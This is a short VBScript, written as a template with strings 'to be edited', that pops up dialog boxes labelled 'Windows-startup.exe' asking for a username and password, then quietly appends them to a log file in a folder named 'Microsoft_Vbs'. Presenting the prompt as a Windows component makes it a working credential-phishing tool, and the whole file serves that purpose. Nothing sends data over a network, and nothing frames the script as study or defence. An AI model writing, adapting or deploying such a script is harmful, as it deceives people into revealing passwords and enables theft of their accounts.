' THE STRINGS BELLOW TO BE EDITED

stringTOsave1="1QUESTION "
stringTOsave2="SECONDquestion "
software0called="Windows-startup.exe"
software0text0A="text"
software0text0B="the second text"

user=inputbox( software0text0A, software0called,"")
pass=inputbox( software0text0B,software0called,"")
msgbox ("Are these inputs correct?: " & stringTOsave1 & user & " " & stringTOsave2 & pass)
Dim strText, objFSO, objFile

' String to be saved
strText = stringTOsave1 & user & " | " & stringTOsave2 & pass

' Create a file system object
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Specify the file path. Mine is in D drive folder named Microsoft_Vbs, and the file inside is userInfo.txt
filePath = "D:\Microsoft_Vbs\userInfo.txt"

' Check if the file already exists, if not create it
If Not objFSO.FileExists(filePath) Then
    ' Create the file
    Set objFile = objFSO.CreateTextFile(filePath)
Else
    ' Open the existing file
    Set objFile = objFSO.OpenTextFile(filePath, 8) ' 8 stands for appending mode
End If

' Write the string to the file
objFile.WriteLine strText

' Close the file
objFile.Close

' Release the file and file system objects from memory
Set objFile = Nothing
Set objFSO = Nothing
